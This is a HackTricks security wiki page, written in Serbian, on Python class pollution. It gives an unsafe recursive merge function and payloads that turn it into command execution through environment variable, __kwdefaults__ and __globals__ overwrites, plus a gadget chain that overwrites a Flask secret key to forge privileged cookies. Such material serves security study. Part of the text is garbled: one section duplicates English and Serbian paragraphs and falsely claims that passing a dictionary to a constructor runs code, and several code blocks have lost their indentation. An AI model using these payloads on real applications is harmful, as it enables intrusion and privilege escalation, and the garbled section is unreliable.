# Class Pollution (Python's Prototype Pollution)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovni primer

Proverite kako je moguće zagađivati klase objekata sa stringovima:

```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```

## Osnovni primer ranjivosti

Consider the following Python code:

Razmotrite sledeći Python kod:

```python
class Person:
    def __init__(self, name):
        self.name = name

person = Person("John")
print(person.name)
```

This code defines a `Person` class with a constructor that takes a `name` parameter and assigns it to the `name` attribute of the object. An instance of the `Person` class is created with the name "John" and the `name` attribute is printed.

Ovaj kod definiše klasu `Person` sa konstruktorom koji prima parametar `name` i dodeljuje ga atributu `name` objekta. Instanca klase `Person` se kreira sa imenom "John" i ispisuje se atribut `name`.

Now, let's say an attacker can control the `name` parameter passed to the constructor:

Sada pretpostavimo da napadač može da kontroliše parametar `name` koji se prosleđuje konstruktoru:

```python
class Person:
    def __init__(self, name):
        self.name = name

name = input("Enter your name: ")
person = Person(name)
print(person.name)
```

In this modified code, the `name` parameter is obtained from user input. This introduces a potential vulnerability because the user can provide unexpected input.

U ovom izmenjenom kodu, parametar `name` se dobija iz korisničkog unosa. Ovo uvodi potencijalnu ranjivost jer korisnik može da pruži neočekivan unos.

For example, if the user enters a dictionary as the `name` input:

Na primer, ako korisnik unese rečnik kao unos za `name`:

```python
name = {"__class__": "Person", "__init__": "print('Hacked!')"}
person = Person(name)
print(person.name)
```

The `name` parameter is now a dictionary with special keys `__class__` and `__init__`. When the `Person` object is created, the `__init__` method of the `Person` class is called with the value `"print('Hacked!')"`. This allows the attacker to execute arbitrary code.

Sada je parametar `name` rečnik sa posebnim ključevima `__class__` i `__init__`. Kada se kreira objekat `Person`, poziva se metoda `__init__` klase `Person` sa vrednošću `"print('Hacked!')"`. Ovo omogućava napadaču da izvrši proizvoljni kod.

```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```

## Primeri uređaja

<details>

<summary>Kreiranje podrazumevane vrednosti svojstva klase za RCE (subprocess)</summary>

\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }

recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"

## Create default value for Employee.custom\_command

merge(USER\_INPUT, recruiter\_emp)

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"

````
</details>

<details>

<summary>Zagađivanje drugih klasa i globalnih promenljivih putem <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
````

</details>

<details>

<summary>Proizvoljno izvršavanje podprocesa</summary>

\`\`\`python import subprocess, json

class Employee: def **init**(self): pass

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

## Overwrite env var "COMSPEC" to execute a calc

USER\_INPUT = json.loads('{"**init**":{"**globals**":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"\}}\}}\}}') # attacker-controlled value

merge(USER\_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up

````
</details>

<details>

<summary>Prepisivanje <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** je poseban atribut svih funkcija, prema Python [dokumentaciji](https://docs.python.org/3/library/inspect.html), to je "mapiranje svih podrazumevanih vrednosti za **samo-ključne** parametre". Zagađivanje ovog atributa nam omogućava kontrolu podrazumevanih vrednosti samo-ključnih parametara funkcije, to su parametri funkcije koji dolaze posle \* ili \*args.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
````

</details>

<details>

<summary>Prepisivanje tajne Flask-a između fajlova</summary>

Dakle, ako možete izvršiti klasnu zagađenost nad objektom koji je definisan u glavnom Python fajlu veba, **čija je klasa definisana u drugom fajlu** od glavnog. Zato što biste, da biste pristupili \_\_globals\_\_ u prethodnim payloadima, morali pristupiti klasi objekta ili metodama klase, moći ćete **pristupiti globalima u tom fajlu, ali ne i u glavnom**.\
Stoga, **nećete moći pristupiti globalnom objektu Flask-a** koji je definisao **tajni ključ** na glavnoj stranici:

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

U ovom scenariju vam je potreban uređaj za pretraživanje datoteka kako biste došli do glavne datoteke i **pristupili globalnom objektu `app.secret_key`** kako biste promenili Flask tajni ključ i bili u mogućnosti da [**povećate privilegije** znajući ovaj ključ](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload poput ovog [iz ovog članka](https://ctftime.org/writeup/36082):

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

Koristite ovaj payload da **promenite `app.secret_key`** (naziv u vašoj aplikaciji može biti drugačiji) kako biste mogli da potpišete nove i privilegovane flask kolačiće.

</details>

Pogledajte takođe sledeću stranicu za više "read-only" gedžeta:

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## Reference

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
